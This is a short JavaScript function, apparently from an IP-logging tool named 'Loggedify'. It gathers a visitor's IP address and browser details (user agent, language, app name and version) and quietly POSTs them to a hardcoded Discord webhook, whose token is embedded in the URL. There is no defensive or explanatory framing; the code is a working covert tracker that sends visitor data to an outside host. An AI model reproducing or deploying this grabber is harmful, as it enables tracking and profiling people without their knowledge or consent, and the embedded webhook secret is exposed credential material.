function getdata(json) {
  var agent = navigator.userAgent;
  var lang = navigator.language;
  var sys = navigator.appCodeName;
  var sys1 = navigator.appName;
  var sys2 = navigator.appVersion;
  var space = " ";
 const xml = new XMLHttpRequest;
      xml.open("POST", "https://discord.com/api/webhooks/1121438794567135304/BNVT5-_I0ur5pWHR93fHGqA1vnQgxz8FIbaqFFPPG0LG5e_bNJnvYqPTASxZ-MgNDda8");
var udata = json.ip +  space + agent + space + lang + space + sys + space + sys1 + space + sys2;
      xml.setRequestHeader('Content-type', 'application/json');

      const params = {
        username: "Loggedify",
        avatar_url: "",
        content: udata
      }

      xml.send(JSON.stringify(params));
}
